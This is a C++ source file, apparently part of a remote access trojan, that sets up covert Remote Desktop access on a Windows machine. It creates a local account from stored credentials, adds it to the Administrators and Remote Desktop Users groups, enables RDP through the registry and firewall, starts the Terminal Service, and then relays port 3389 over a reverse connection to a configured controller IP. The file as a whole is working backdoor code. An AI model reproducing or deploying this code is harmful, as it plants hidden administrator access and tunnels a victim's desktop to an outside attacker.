#include"Globals.h"
#include<Lm.h>
#include"Net.h"
#include"Log.h"
#include"Utils.h"
#include<netfw.h>
#include <sddl.h>
#include"Strings.h"
#include"Conf.h"
#pragma comment(lib,"Netapi32.lib")
namespace RDP {



    bool isServiceRunning(const char* serviceName) {
        SC_HANDLE scm, service;
        SERVICE_STATUS status;
        scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
        if (!scm) {
            return false;
        }

        service = OpenServiceA(scm, serviceName, SERVICE_QUERY_STATUS);
        if (!service) {
            CloseServiceHandle(scm);
            return false;
        }

        if (!QueryServiceStatus(service, &status)) {
            CloseServiceHandle(service);
            CloseServiceHandle(scm);
            return false;
        }
        bool isRunning = (status.dwCurrentState == SERVICE_RUNNING);
        CloseServiceHandle(service);
        CloseServiceHandle(scm);

        return isRunning;
    }

    bool createUserAccount(const wchar_t* username, const wchar_t* password) {

        USER_INFO_1 userInfo = { 0 };
        userInfo.usri1_name = (wchar_t*)username;
        userInfo.usri1_password = (wchar_t*)password;
        userInfo.usri1_priv = USER_PRIV_USER;
        userInfo.usri1_home_dir = nullptr;
        userInfo.usri1_comment = nullptr;
        userInfo.usri1_flags = UF_NORMAL_ACCOUNT | UF_SCRIPT;

        NET_API_STATUS result = NetUserAdd(nullptr, 1, (unsigned char*)&userInfo, nullptr);

        if (result == NERR_Success) {
            Log::SaveLog((wchar_t*)L"RDP account was created");
            return true;
        }
        else {
            std::wstring error(L"Error Creating RDP account , error code :" + std::to_wstring(result)+std::wstring(username));
            Log::SaveLog((wchar_t*)error.c_str());
            return false;
        }

        return true;
    }



    _inline int AddToGroup(wchar_t* groupn, wchar_t* username)
    {
        LOCALGROUP_MEMBERS_INFO_3 lgmi3;
        DWORD dwLevel = 3;
        DWORD totalEntries = 1;
        NET_API_STATUS nStatus;
        lgmi3.lgrmi3_domainandname = username;

        nStatus = NetLocalGroupAddMembers(NULL, groupn, 3,
            (LPBYTE)&lgmi3, totalEntries);
        if (nStatus == 1378) {
            std::wstring error(L"User already member of group : "+std::wstring(groupn));
            Log::SaveLog((wchar_t*)error.c_str()); return 0; 
        }
        if (nStatus) { 
            std::wstring error(L"error adding user to group : "+ std::wstring(groupn) + L" , error code : "+std::to_wstring(nStatus));
            Log::SaveLog((wchar_t*)error.c_str());

        }
        else { Log::SaveLog((wchar_t*)std::wstring(L"User Was Added to the Group : " + std::wstring(groupn)).c_str()); }
        return nStatus;
    }

    _inline void addtogroup(const char* groupsid, wchar_t* user) {
        PSID Group;
        BOOL b = FALSE;
        if (!ConvertStringSidToSidA(groupsid, &Group)) { return; }

        wchar_t namegroup[300];
        wchar_t domain[300];
        DWORD lengrp = sizeof(namegroup) / sizeof(wchar_t);
        DWORD lendm = sizeof(domain) / sizeof(wchar_t);

        SID_NAME_USE groupinf;
        LookupAccountSidW(NULL, Group, namegroup, &lengrp, domain, &lendm, &groupinf);
        AddToGroup(namegroup,user);

        LocalFree(Group);

    }

    void AddUserToGroups(wchar_t *user)
    {



        const char* groups[] = { "S-1-5-32-555","S-1-5-32-544" };

        for (int i = 0; i < sizeof(groups) / sizeof(char*); i++) {
            addtogroup(groups[i],user);
        }

        return;
    }

    bool doesUserExist(const wchar_t* username) {
        USER_INFO_1* userInfo = nullptr;
        NET_API_STATUS result = NetUserGetInfo(nullptr, username, 1, reinterpret_cast<LPBYTE*>(&userInfo));

        if (result == NERR_Success) {
            NetApiBufferFree(userInfo);
            return true;
        }
        else if (result == NERR_UserNotFound) {
            NetApiBufferFree(userInfo);
            return false;
        }
        else {
            NetApiBufferFree(userInfo);
            return false;
        }
    }

    bool startService(const wchar_t* serviceName) {
        SC_HANDLE scm, service;

        scm = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
        if (!scm) {
            std::wstring error(L"Failed to open Service Control Manager. Error code: " + std::to_wstring(GetLastError()));
            Log::SaveLog((wchar_t*)error.c_str());
            return false;
        }

        service = OpenService(scm, serviceName, SERVICE_START | SERVICE_QUERY_STATUS);
        if (!service) {
            std::wstring error(L"Failed to open service. Error code: " + std::to_wstring(GetLastError()));
            Log::SaveLog((wchar_t*)error.c_str());
            CloseServiceHandle(scm);
            return false;
        }

        if (!StartService(service, 0, nullptr)) {
            std::wstring error(L"Failed to start service. Error code:  " + std::to_wstring(GetLastError()));
            Log::SaveLog((wchar_t*)error.c_str());
            CloseServiceHandle(service);
            CloseServiceHandle(scm);
            return false;
        }

        std::wstring started(L"Service '" + std::wstring(serviceName) + L"' started successfully.");
        Log::SaveLog((wchar_t*)started.c_str());
        CloseServiceHandle(service);
        CloseServiceHandle(scm);

        return true;
    }




    void EnableRulefw(PCWSTR cgroup, VARIANT_BOOL enable)
    {
        HRESULT hr = CoInitialize(nullptr);  // Initialize COM

        if (SUCCEEDED(hr))
        {
            if (BSTR group = SysAllocString(cgroup))
            {
                INetFwPolicy2* pNetFwPolicy2;

                hr = CoCreateInstance(__uuidof(NetFwPolicy2), nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pNetFwPolicy2));

                if (SUCCEEDED(hr))
                {
                    hr = pNetFwPolicy2->EnableRuleGroup(NET_FW_PROFILE2_ALL, group, enable);

                    if (FAILED(hr))
                    {
                        std::wstring error(L"Failed to enable/disable firewall rule group. Error code: " + std::to_wstring(GetLastError()));
                        Log::SaveLog((wchar_t*)error.c_str());
                    }

                    pNetFwPolicy2->Release();
                }
                else
                {
                    std::wstring error(L"Failed to create INetFwPolicy2 object. Error code: " + std::to_wstring(GetLastError()));
                    Log::SaveLog((wchar_t*)error.c_str());
                }

                SysFreeString(group);
            }
            else
            {
                hr = E_OUTOFMEMORY;
            }
            
            CoUninitialize();  // Uninitialize COM
        }
        else {
            Log::SaveLog((wchar_t*)L"error com init");
        }

        return;
    }
    bool setRegistryValue() {
        HKEY hKey = HKEY_LOCAL_MACHINE;
        const wchar_t* subkey = L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server";
        const wchar_t* valueName = L"fDenyTSConnections";
        DWORD newValue = 0;
        HKEY openedKey;
        if (RegOpenKeyEx(hKey, subkey, 0, KEY_SET_VALUE, &openedKey) != ERROR_SUCCESS) {
            std::wstring error(L"Failed to open registry key. Error code: "+std::to_wstring(GetLastError()));
            Log::SaveLog((wchar_t*)error.c_str());


            return false;
        }
        if (RegSetValueEx(openedKey, valueName, 0, REG_DWORD, reinterpret_cast<const BYTE*>(&newValue), sizeof(DWORD)) != ERROR_SUCCESS) {
            std::wstring error(L"Failed to set registry value. Error code: " + std::to_wstring(GetLastError()));
            Log::SaveLog((wchar_t*)error.c_str());
            RegCloseKey(openedKey);
            return false;
        }

        Log::SaveLog((wchar_t*)L"Changed registry value");
        RegCloseKey(openedKey);

        return true;
    }


    void _stdcall StartRDP(int *pport) {

        int port = *pport;
        auto username = Strings::GetVect("rdpusr");

        if (!doesUserExist((wchar_t*)&username[0])) { 
            //create account and init
            auto pwd = Strings::GetVect("pwdrdp");
            createUserAccount((wchar_t*)&username[0], (wchar_t*)&pwd[0]);
            AddUserToGroups((wchar_t*)&username[0]);
            setRegistryValue();
            EnableRulefw(L"@FirewallAPI.dll,-28752", VARIANT_TRUE);

        
        }


        if (!isServiceRunning("termservice")) { startService(L"termservice"); }

        SOCKET srv = Net::connectSrv((char*)Config::ip.c_str(), port);
        if (srv == SOCKET_ERROR) { closesocket(srv); delete pport; return; }

        SOCKET rds = Net::connectSrv((char*)"127.0.0.1", 3389);
        if (rds == SOCKET_ERROR) { closesocket(srv); closesocket(rds); delete pport; return; }

        //////////////start

        fd_set fd;
        FD_ZERO(&fd);
        char buff[4096];
        int e;
        while (1) {
            FD_SET(rds, &fd);
            FD_SET(srv, &fd);
            select(1, &fd, NULL, NULL, NULL);
            if (FD_ISSET(srv, &fd)) {

                e = recv(srv, buff, sizeof(buff), 0);
                send(rds, buff, e, 0);
                if (e <= 0) { break; }

            }
            if (FD_ISSET(rds, &fd)) {

                e = recv(rds, buff, sizeof(buff), 0);
                send(srv, buff, e, 0);
                if (e <= 0) { break; }

            }



        }
        closesocket(rds);
        closesocket(srv);
        delete pport;
        return;
        


    }

}